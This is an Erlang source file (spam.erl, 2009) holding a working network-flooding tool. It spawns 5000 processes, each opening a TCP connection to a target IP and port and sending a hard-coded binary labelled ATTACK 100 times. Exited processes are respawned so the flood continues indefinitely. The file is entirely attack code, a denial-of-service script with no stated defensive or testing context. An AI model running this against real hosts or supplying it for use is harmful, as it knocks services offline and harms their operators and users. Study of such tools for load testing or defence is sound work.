%%%-------------------------------------------------------------------
%%% File    : spam.erl
%%% Author  : Olle Mattsson <olle@zubat>
%%% Description : 
%%%
%%% Created : 16 May 2009 by Olle Mattsson <olle@zubat>
%%%-------------------------------------------------------------------
-module(spam).

-compile(export_all).


-define(ATTACK,<<28,0,55,14,123,176,55,218,163,140,140,
		237,243,138,186,65,41,95,107,115,224,
		206,174,101,188,160,193,193,235,21>> ).

spam(Ip, Port) ->
    spam(Ip, Port, 5000, []).

spam(Ip, Port, 0, Pids) ->
    process_flag(trap_exit, true),
    spam_loop(Ip, Port,Pids);
spam(Ip, Port, Procs, Pids) ->
    Pid = spawn_link(?MODULE, spam_connect, [Ip, Port]),
    spam(Ip, Port, Procs-1, [{Pid}|Pids]).




spam_connect(Ip, Port) ->
    case gen_tcp:connect(Ip, Port, [binary]) of
	{ok, Sock} ->
 	    spam_send(Sock,100);
	{error, _Reason} ->
	    exit(not_connected)
    end.

spam_send(_Sock, 0) ->
    exit(done);
spam_send(Sock, Msgs) ->
    gen_tcp:send(Sock,?ATTACK),
    spam_send(Sock, Msgs-1).


spam_loop(Ip, Port,Pids) when length(Pids) < 5000 ->
    Pid = spawn_link(?MODULE, spam_connect, [Ip, Port]),
    spam_loop(Ip, Port,[Pid|Pids]);

spam_loop(Ip, Port,Pids) ->
    receive
	{'EXIT', Pid, _} ->
	    Pid2 = spawn_link(?MODULE, spam_connect, [Ip, Port]),
	    spam_loop(Ip, Port, lists:keystore(Pid, 1, Pids, {Pid2}));
	Any ->
	    io:format("Any, ~p\n", [Any]),
	    spam_loop(Ip, Port, Pids)
    end.
    
